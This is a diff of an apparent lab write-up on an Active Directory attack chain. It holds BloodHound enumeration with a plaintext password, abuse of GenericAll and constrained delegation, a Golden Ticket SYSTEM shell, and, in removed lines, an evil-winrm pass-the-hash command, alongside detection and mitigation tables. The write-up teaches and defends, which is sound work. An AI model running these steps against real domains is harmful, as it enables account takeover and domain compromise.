@@ -142,17 +142,13 @@ bloodhound-python -d corp.local -u m.orlov -p 'MOrlov_Backup2026!' -ns 192.168.3
 
 Load BloodHound and search for `m.orlov`:
 
-```
-MATCH (n:User {name:"M.ORLOV@CORP.LOCAL"})-[r]->(m) RETURN n,r,m
-```
+![m.orlov GenericAll on svc_report](screenshots/orlovGenerivsvc.png)
 
 Output:
 
 ```
 m.orlov --[GenericAll]--> svc_report
 ```
-
-![m.orlov GenericAll on svc_report](orlovGenerivsvc.png)
 
 **Result:** `m.orlov` has **GenericAll** on `svc_report`. This allows us to reset `svc_report`'s password without knowing the current one.
 
@@ -185,17 +181,13 @@ SMB  192.168.31.100  445  DC01  [+] corp.local\svc_report:ReportSvc2026New!
 
 Now that we control `svc_report`, we enumerate its rights in BloodHound.
 
-```
-MATCH (n:User {name:"SVC_REPORT@CORP.LOCAL"})-[r]->(m) RETURN n,r,m
-```
+![svc_report AllowedToDelegate to DC01](screenshots/AllowedToDelegate.png)
 
 Output:
 
 ```
 svc_report --[AllowedToDelegate]--> DC01.CORP.LOCAL
 ```
-
-![svc_report AllowedToDelegate to DC01](AllowedToDelegate.png)
 
 **Result:** `svc_report` has **Constrained Delegation** to `DC01.CORP.LOCAL` via `msDS-AllowedToDelegateTo`.
 
@@ -325,23 +317,6 @@ Microsoft Windows [Version 10.0.20348.587]
 C:\Windows\system32> whoami
 nt authority\system
 ```
-
-**Result:** Domain Admin achieved via Golden Ticket.
-
-### 13. Pass-the-Hash (Verification)
-
-```bash
-evil-winrm -i 192.168.31.100 -u Administrator -H '7b71bee7907489b8dea9a06bab7917b2'
-```
-
-Output:
-
-```
-*Evil-WinRM* PS C:\Users\Administrator\Documents>
-```
-
-**Result:** Pass-the-Hash works.
-
 ## Detection
 
 | Attack | Event ID | Source |
@@ -353,7 +328,7 @@ Output:
 | LDAP ACL Modification | 5136 | DC Security Log |
 | DCSync | 4662 (Replicating Directory Changes) | DC Security Log |
 | Golden Ticket | 4769 (Anomalous TGT) | DC Security Log |
-| Pass-the-Hash | 4624 (Logon Type 3, NTLM) | DC Security Log |
+
 
 **What to look for:**
 
@@ -375,7 +350,7 @@ Output:
 | LDAP ACL Modification | Audit ACL changes; restrict LDAP access |
 | DCSync | Audit Replicating Directory Changes; don't grant to service accounts |
 | Golden Ticket | Rotate krbtgt twice; monitor anomalous TGT lifetime |
-| Pass-the-Hash | Disable NTLM; use Kerberos; Protected Users |
+
 
 ## Tools Used
 
